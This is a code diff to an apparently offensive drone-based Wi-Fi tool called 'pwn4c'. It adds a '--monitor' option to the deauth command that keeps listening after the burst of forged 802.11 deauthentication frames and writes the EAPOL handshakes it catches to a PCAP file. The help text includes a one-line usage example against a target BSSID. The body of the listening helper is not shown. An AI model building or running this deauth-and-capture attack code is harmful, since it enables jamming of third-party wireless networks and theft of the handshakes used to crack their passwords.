@@ -16,15 +16,20 @@ var (
         deauthInterval int
         deauthChannel  int
         deauthTarget   string
+        deauthMonitor  bool
+        deauthOut      string
 )
 
 var deauthCmd = &cobra.Command{
         Use:   "deauth [target_drone_ip]",
         Short: "Inject IEEE 802.11 Deauthentication frames to disconnect Wi-Fi clients",
         Long: `Generates raw 802.11 management deauthentication frames and commands the drone
-to inject them over the air. The control session stays open until the drone's
-paced TX queue has fully drained, so the burst is never cut short and the
-radio is torn down cleanly.`,
+to inject them over the air.
+
+Use --monitor to keep the session alive after the burst and stream the
+aftermath (probe requests, re-associations, EAPOL handshakes) straight into a
+PCAP file — the classic deauth-and-listen workflow in a single command:
+  pwn4c deauth -b AA:BB:CC:DD:EE:FF -i 6 --monitor -o handshake.pcap`,
         Args: cobra.MaximumNArgs(1),
         Run: func(cmd *cobra.Command, args []string) {
                 target := deauthTarget
@@ -85,6 +90,11 @@ radio is torn down cleanly.`,
                                 fmt.Printf("[!] Failed to switch channel: %v\n", err)
                                 os.Exit(1)
                         }
+                }
+
+                if deauthMonitor {
+                        runDeauthWithListen(client, frameHex)
+                        return
                 }
 
                 // 4. Plain burst: inject, then leave the radio exactly how we found it
@@ -152,6 +162,8 @@ func init() {
         deauthCmd.Flags().IntVarP(&deauthCount, "count", "n", 10, "Number of deauth frames to transmit")
         deauthCmd.Flags().IntVar(&deauthInterval, "interval", 10, "Interval between transmissions in milliseconds")
         deauthCmd.Flags().StringVarP(&deauthTarget, "target", "t", "", "Drone IP address")
+        deauthCmd.Flags().BoolVar(&deauthMonitor, "monitor", false, "Keep listening after the burst and write the aftermath to a PCAP (handshake capture)")
+        deauthCmd.Flags().StringVarP(&deauthOut, "out", "o", "", "PCAP output file for --monitor (default: handshake.pcap)")
         _ = deauthCmd.MarkFlagRequired("bssid")
 
         rootCmd.AddCommand(deauthCmd)
